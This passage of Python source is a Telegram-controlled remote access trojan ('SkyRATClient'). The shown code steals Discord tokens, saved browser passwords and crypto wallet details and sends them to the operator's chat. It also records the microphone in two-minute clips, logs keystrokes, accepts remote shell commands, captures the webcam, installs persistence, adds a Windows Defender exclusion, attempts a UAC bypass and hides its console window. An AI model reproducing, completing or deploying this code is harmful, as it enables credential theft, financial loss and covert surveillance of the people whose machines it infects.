                    message = "🎯 **Discord Tokens Found**\n\n"
                    for i, token in enumerate(tokens, 1):
                        if len(message) > 3500:  # Telegram limit
                            await update.message.reply_text(message, parse_mode='Markdown')
                            message = "🎯 **Discord Tokens (continued)**\n\n"

                        message += f"**Token {i}:**\n`{token}`\n\n"

                    await update.message.reply_text(message, parse_mode='Markdown')
                else:
                    await update.message.reply_text("❌ No Discord tokens found")

            elif target == "passwords":
                await update.message.reply_text("🔍 Grabbing saved passwords...")
                passwords = self.grab_passwords()

                if passwords:
                    message = "🔑 **Saved Passwords Found**\n\n"
                    for url, creds in passwords.items():
                        if len(message) > 3500:  # Telegram limit
                            await update.message.reply_text(message, parse_mode='Markdown')
                            message = "🔑 **Saved Passwords (continued)**\n\n"

                        message += f"🔗 **{url}**\n"
                        message += f"👤 Username: `{creds[0]}`\n"
                        message += f"🔑 Password: `{creds[1]}`\n\n"

                    await update.message.reply_text(message, parse_mode='Markdown')
                else:
                    await update.message.reply_text("❌ No saved passwords found")

            elif target == "wallets":
                await update.message.reply_text("🔍 Grabbing crypto wallets...")
                wallets = grabber.grab_crypto_wallets()

                if wallets:
                    message = "💰 **Crypto Wallets Found**\n\n"
                    for wallet in wallets:
                        message += f"**{wallet['name']}**\n"
                        message += f"📁 Path: `{wallet['path']}`\n"
                        message += f"📋 Type: {wallet['type']}\n\n"

                    await update.message.reply_text(message, parse_mode='Markdown')
                else:
                    await update.message.reply_text("❌ No crypto wallets found")

            elif target == "all":
                await update.message.reply_text("🔍 Grabbing everything... This may take a moment...")

                # Grab Discord tokens
                tokens = grabber.grab_discord_tokens()
                if tokens:
                    message = "🎯 **Discord Tokens**\n\n"
                    for i, token in enumerate(tokens[:3], 1):  # Limit to first 3
                        message += f"**Token {i}:** `{token}`\n"
                    if len(tokens) > 3:
                        message += f"\n... and {len(tokens) - 3} more tokens"
                    await update.message.reply_text(message, parse_mode='Markdown')

                # Grab passwords
                passwords = self.grab_passwords()
                if passwords:
                    message = "🔑 **Saved Passwords**\n\n"
                    count = 0
                    for url, creds in passwords.items():
                        if count >= 5:  # Limit to first 5
                            message += f"\n... and {len(passwords) - 5} more passwords"
                            break
                        message += f"🔗 {url}\n👤 {creds[0]} | 🔑 {creds[1]}\n\n"
                        count += 1
                    await update.message.reply_text(message, parse_mode='Markdown')

                # Grab wallets
                wallets = grabber.grab_crypto_wallets()
                if wallets:
                    message = "💰 **Crypto Wallets**\n\n"
                    for wallet in wallets[:5]:  # Limit to first 5
                        message += f"**{wallet['name']}** - {wallet['type']}\n"
                    if len(wallets) > 5:
                        message += f"\n... and {len(wallets) - 5} more wallets"
                    await update.message.reply_text(message, parse_mode='Markdown')

                if not tokens and not passwords and not wallets:
                    await update.message.reply_text("❌ No data found to grab")

            else:
                await update.message.reply_text(
                    "❌ Invalid target. Use: `discord`, `passwords`, `wallets`, or `all`",
                    parse_mode='Markdown'
                )

        except Exception as e:
            await update.message.reply_text(f"❌ Grab failed: {str(e)}")

    def record_microphone(self, duration=120):
        """Record microphone for specified duration (default 2 minutes)"""
        if not HAS_PYAUDIO:
            return None

        try:
            import wave

            # Audio settings
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            p = pyaudio.PyAudio()

            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)

            frames = []

            # Record for specified duration
            for _ in range(0, int(RATE / CHUNK * duration)):
                if not recording_active:  # Check if recording should stop
                    break
                data = stream.read(CHUNK)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            p.terminate()

            # Save to temporary file
            temp_file = os.path.join(tempfile.gettempdir(), f"mic_recording_{int(time.time())}.wav")
            wf = wave.open(temp_file, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            return temp_file

        except Exception as e:
            logger.error(f"Recording error: {e}")
            return None

    def start_recording_thread(self):
        """Start recording in a separate thread"""
        global recording_active

        def recording_worker():
            while recording_active:
                try:
                    # Record for 2 minutes
                    audio_file = self.record_microphone(120)

                    if audio_file and os.path.exists(audio_file):
                        # Send the audio file using asyncio
                        try:
                            asyncio.create_task(self.send_audio_file(audio_file))
                        except Exception as e:
                            logger.error(f"Failed to send audio: {e}")

                        # Clean up temp file
                        try:
                            os.remove(audio_file)
                        except:
                            pass

                except Exception as e:
                    logger.error(f"Recording worker error: {e}")

                # Small delay before next recording
                time.sleep(1)

        recording_thread = threading.Thread(target=recording_worker, daemon=True)
        recording_thread.start()
        return recording_thread

    async def send_audio_file(self, audio_file):
        """Send audio file to Telegram"""
        try:
            with open(audio_file, 'rb') as audio:
                await self.application.bot.send_audio(
                    chat_id=self.chat_id,
                    audio=audio,
                    caption=f"🎤 Mic Recording - {self.current_time(seconds_also=True)}"
                )
        except Exception as e:
            logger.error(f"Failed to send audio file: {e}")

    def prettify_key(self, key):
        """Prettify special keys for better readability"""
        key_mappings = {
            'Key.space': ' ',
            'Key.enter': '[ENTER]',
            'Key.tab': '[TAB]',
            'Key.backspace': '[BACKSPACE]',
            'Key.delete': '[DELETE]',
            'Key.shift': '[SHIFT]',
            'Key.shift_r': '[SHIFT]',
            'Key.ctrl': '[CTRL]',
            'Key.ctrl_r': '[CTRL]',
            'Key.alt': '[ALT]',
            'Key.alt_r': '[ALT]',
            'Key.cmd': '[CMD]',
            'Key.cmd_r': '[CMD]',
            'Key.esc': '[ESC]',
            'Key.up': '[UP]',
            'Key.down': '[DOWN]',
            'Key.left': '[LEFT]',
            'Key.right': '[RIGHT]',
            'Key.home': '[HOME]',
            'Key.end': '[END]',
            'Key.page_up': '[PAGE_UP]',
            'Key.page_down': '[PAGE_DOWN]',
            'Key.caps_lock': '[CAPS_LOCK]',
            'Key.num_lock': '[NUM_LOCK]',
            'Key.scroll_lock': '[SCROLL_LOCK]',
            'Key.insert': '[INSERT]',
            'Key.f1': '[F1]',
            'Key.f2': '[F2]',
            'Key.f3': '[F3]',
            'Key.f4': '[F4]',
            'Key.f5': '[F5]',
            'Key.f6': '[F6]',
            'Key.f7': '[F7]',
            'Key.f8': '[F8]',
            'Key.f9': '[F9]',
            'Key.f10': '[F10]',
            'Key.f11': '[F11]',
            'Key.f12': '[F12]',
        }

        key_str = str(key)
        return key_mappings.get(key_str, key_str.replace("'", ""))

    def on_key_press(self, key):
        """Handle key press events"""
        global current_keylog, keylog_file_path

        try:
            current_time = datetime.now().strftime('%H:%M:%S')
            prettified_key = self.prettify_key(key)

            # Add to current keylog (accumulate on one line)
            if prettified_key == '[ENTER]':
                # Add enter to current line and send
                current_keylog += prettified_key
                if current_keylog.strip():
                    # Send the complete line
                    asyncio.create_task(self.send_keylog(current_keylog))

                    # Save complete line to offline file
                    if not keylog_file_path:
                        keylog_file_path = os.path.join(f'C:\\Users\\{getuser()}\\{software_directory_name}', 'keylog.txt')

                    try:
                        with open(keylog_file_path, 'a', encoding='utf-8') as f:
                            f.write(f"[{current_time}] {current_keylog}\n")
                    except:
                        pass

                    current_keylog = ""  # Reset for next line
            else:
                current_keylog += prettified_key

                # Limit keylog length to prevent Telegram message limits
                if len(current_keylog) > 3500:
                    # Send current accumulated keys
                    asyncio.create_task(self.send_keylog(current_keylog + " [MAX_LENGTH_REACHED]"))

                    # Save to offline file
                    if not keylog_file_path:
                        keylog_file_path = os.path.join(f'C:\\Users\\{getuser()}\\{software_directory_name}', 'keylog.txt')

                    try:
                        with open(keylog_file_path, 'a', encoding='utf-8') as f:
                            f.write(f"[{current_time}] {current_keylog} [MAX_LENGTH_REACHED]\n")
                    except:
                        pass

                    current_keylog = ""  # Reset

        except Exception as e:
            logger.error(f"Keylogger error: {e}")

    async def send_keylog(self, keylog_text):
        """Send keylog text to Telegram"""
        try:
            if keylog_text.strip() and self.chat_id:
                current_time = datetime.now().strftime('%H:%M:%S')
                message = f"⌨️ **Keylog [{current_time}]**\n\n`{keylog_text}`"

                await self.application.bot.send_message(
                    chat_id=self.chat_id,
                    text=message,
                    parse_mode='Markdown'
                )
        except Exception as e:
            logger.error(f"Failed to send keylog: {e}")

    def start_keylogger_thread(self):
        """Start keylogger in a separate thread"""
        global keylogger_active

        if not HAS_PYNPUT:
            return

        try:
            from pynput import keyboard

            def keylogger_worker():
                with keyboard.Listener(on_press=self.on_key_press) as listener:
                    while keylogger_active:
                        time.sleep(0.1)
                    listener.stop()

            keylogger_thread = threading.Thread(target=keylogger_worker, daemon=True)
            keylogger_thread.start()
            return keylogger_thread

        except Exception as e:
            logger.error(f"Keylogger thread error: {e}")
            return None

    async def startrecording_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /startrecording command"""
        if not self.authorized:
            return

        global recording_active, recording_thread

        if not HAS_PYAUDIO:
            await update.message.reply_text("❌ Recording feature not available (pyaudio not installed)")
            return

        if recording_active:
            await update.message.reply_text("⚠️ Recording is already active!")
            return

        try:
            recording_active = True
            recording_thread = self.start_recording_thread()
            if recording_thread:
                await update.message.reply_text("🎤 **Recording Started!**\n\nSending audio files every 2 minutes...")
            else:
                recording_active = False
                await update.message.reply_text("❌ Failed to start recording thread")

        except Exception as e:
            recording_active = False
            await update.message.reply_text(f"❌ Failed to start recording: {str(e)}")

    async def stoprecording_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stoprecording command"""
        if not self.authorized:
            return

        global recording_active, recording_thread

        if not recording_active:
            await update.message.reply_text("⚠️ Recording is not active!")
            return

        try:
            recording_active = False
            if recording_thread:
                recording_thread.cancel()
                recording_thread = None

            await update.message.reply_text("🛑 **Recording Stopped!**")

        except Exception as e:
            await update.message.reply_text(f"❌ Failed to stop recording: {str(e)}")

    async def startkeylogger_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /startkeylogger command"""
        if not self.authorized:
            return

        global keylogger_active, keylogger_thread, current_keylog

        if not HAS_PYNPUT:
            await update.message.reply_text("❌ Keylogger feature not available (pynput not installed)")
            return

        if keylogger_active:
            await update.message.reply_text("⚠️ Keylogger is already active!")
            return

        try:
            keylogger_active = True
            current_keylog = ""
            keylogger_thread = self.start_keylogger_thread()
            if keylogger_thread:
                await update.message.reply_text("⌨️ **Keylogger Started!**\n\nSending keys when Enter is pressed...")
            else:
                keylogger_active = False
                await update.message.reply_text("❌ Failed to start keylogger thread")

        except Exception as e:
            keylogger_active = False
            await update.message.reply_text(f"❌ Failed to start keylogger: {str(e)}")

    async def stopkeylogger_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stopkeylogger command"""
        if not self.authorized:
            return

        global keylogger_active, keylogger_thread

        if not keylogger_active:
            await update.message.reply_text("⚠️ Keylogger is not active!")
            return

        try:
            keylogger_active = False
            if keylogger_thread:
                keylogger_thread.cancel()
                keylogger_thread = None

            await update.message.reply_text("🛑 **Keylogger Stopped!**")

        except Exception as e:
            await update.message.reply_text(f"❌ Failed to stop keylogger: {str(e)}")

    async def offlinekeylogger_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /offlinekeylogger command"""
        if not self.authorized:
            return

        try:
            keylog_path = os.path.join(f'C:\\Users\\{getuser()}\\{software_directory_name}', 'keylog.txt')

            if not os.path.exists(keylog_path):
                await update.message.reply_text("❌ No offline keylog file found!")
                return

            file_size = os.path.getsize(keylog_path)
            if file_size == 0:
                await update.message.reply_text("❌ Keylog file is empty!")
                return

            # Send the keylog file
            with open(keylog_path, 'rb') as keylog_file:
                await update.message.reply_document(
                    document=keylog_file,
                    filename=f"keylog_{self.current_time()}.txt",
                    caption=f"📋 **Offline Keylog File**\n\nSize: {file_size:,} bytes"
                )

        except Exception as e:
            await update.message.reply_text(f"❌ Failed to upload keylog: {str(e)}")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        if not self.authorized:
            return

        await self.show_client_list(update)

    async def run_bot(self):
        """Run the Telegram bot"""
        try:
            # Create application
            self.application = Application.builder().token(BOT_TOKEN).build()

            # Add command handlers (only for enabled commands)
            self.application.add_handler(CommandHandler("start", self.start_command))

            if "/ss" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("ss", self.screenshot_command))
            if "/cmd" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("cmd", self.cmd_command))
            if "/cd" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("cd", self.cd_command))
            if "/ls" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("ls", self.ls_command))
            if "/execute" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("execute", self.execute_command))
            if "/listprocesses" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("listprocesses", self.listprocesses_command))
            if "/killprocess" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("killprocess", self.killprocess_command))
            if "/remove" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("remove", self.remove_command))
            if "/webcam" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("webcam", self.webcam_command))
            if "/upload" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("upload", self.upload_command))
            if "/tts" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("tts", self.tts_command))
            if "/blockinput" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("blockinput", self.blockinput_command))
            if "/unblockinput" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("unblockinput", self.unblockinput_command))
            if "/disablemonitors" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("disablemonitors", self.disablemonitors_command))
            if "/enablemonitors" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("enablemonitors", self.enablemonitors_command))
            if "/help" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("help", self.help_command))
            if "/grab" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("grab", self.grab_command))
            if "/startrecording" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("startrecording", self.startrecording_command))
            if "/stoprecording" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("stoprecording", self.stoprecording_command))
            if "/startkeylogger" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("startkeylogger", self.startkeylogger_command))
            if "/stopkeylogger" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("stopkeylogger", self.stopkeylogger_command))
            if "/offlinekeylogger" in ENABLED_COMMANDS:
                self.application.add_handler(CommandHandler("offlinekeylogger", self.offlinekeylogger_command))

            # Handle file uploads
            self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_file_upload))

            # Handle authorization token input
            self.application.add_handler(MessageHandler(
                filters.TEXT & ~filters.COMMAND,
                self.handle_auth_token
            ))

            # Start bot
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()

            # Keep running
            while True:
                await asyncio.sleep(1)

        except Exception as e:
            logger.error(f"Bot error: {e}")
            # Restart after delay
            await asyncio.sleep(30)
            await self.run_bot()

    def initialize_system(self):
        """Initialize system components"""
        try:
            # Kill duplicate processes
            self.kill_duplicate_processes()

            # Create first run marker
            self.create_key_file()

            # Install persistence
            self.install_persistence()

            # Add Windows Defender exclusion
            self.add_defender_exclusion()

            # Try UAC bypass if not admin
            if not self.is_admin():
                self.uac_bypass()

        except Exception as e:
            logger.error(f"System initialization error: {e}")

    async def start(self):
        """Start the RAT client"""
        try:
            # Initialize system
            self.initialize_system()

            # Start bot
            await self.run_bot()

        except Exception as e:
            logger.error(f"Startup error: {e}")
            # Restart after delay
            await asyncio.sleep(60)
            await self.start()

# Main execution
async def main():
    """Main function"""
    client = SkyRATClient()
    await client.start()

if __name__ == "__main__":
    try:
        # Hide console window
        if hasattr(sys, "frozen"):
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

        # Run the client
        asyncio.run(main())
    except Exception as e:
        # Silent fail for stealth
        pass
